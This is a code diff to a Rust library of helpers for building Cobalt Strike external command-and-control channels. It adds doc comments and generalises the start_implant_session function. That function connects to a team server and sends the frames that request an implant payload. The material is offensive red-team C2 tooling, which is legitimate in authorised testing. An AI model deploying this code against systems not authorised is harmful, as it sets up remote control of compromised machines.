@@ -1,15 +1,30 @@
+#![warn(missing_docs)]
+
+//! Helper utilities for creating [external c2][1] systems for [cobaltstrike][2].
+//!
+//! ![C2](https://i.ibb.co/Cszd81H/externalc2.png)
+//!
+//!
+//!
+//![1]: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_external-c2.htm
+//! [2]: https://www.cobaltstrike.com/
+
 use async_trait::async_trait;
 use tokio::{
     io::{AsyncReadExt, AsyncWriteExt},
-    net::TcpStream,
+    net::{TcpStream, ToSocketAddrs},
 };
 
+/// Reads and writes cobaltstrike frames from an asynchronous source.
 #[async_trait]
 pub trait CSFrame {
+    /// Write a single frame.
     async fn write_frame(
         &mut self,
         data: &[u8],
     ) -> Result<(), Box<dyn std::error::Error>>;
+
+    /// Reads a single frame.
     async fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
 }
 
@@ -35,15 +50,18 @@ where
     }
 }
 
-pub async fn start_implant_session(
-    ts_address: &str,
-    arch: &str,
-    pipename: &str,
+/// Starts a session with the team server.
+///
+/// More Text
+pub async fn start_implant_session<A: ToSocketAddrs, S: AsRef<str>>(
+    ts_address: &A,
+    arch: S,
+    pipename: S,
 ) -> Result<(Vec<u8>, TcpStream), Box<dyn std::error::Error>> {
     let mut conn = TcpStream::connect(ts_address).await?;
-    conn.write_frame(format!("arch={}", arch).as_bytes())
+    conn.write_frame(format!("arch={}", arch.as_ref()).as_bytes())
         .await?;
-    conn.write_frame(format!("pipename={}", pipename).as_bytes())
+    conn.write_frame(format!("pipename={}", pipename.as_ref()).as_bytes())
         .await?;
     conn.write_frame("block=500".as_bytes()).await?;
     conn.write_frame("go".as_bytes()).await?;
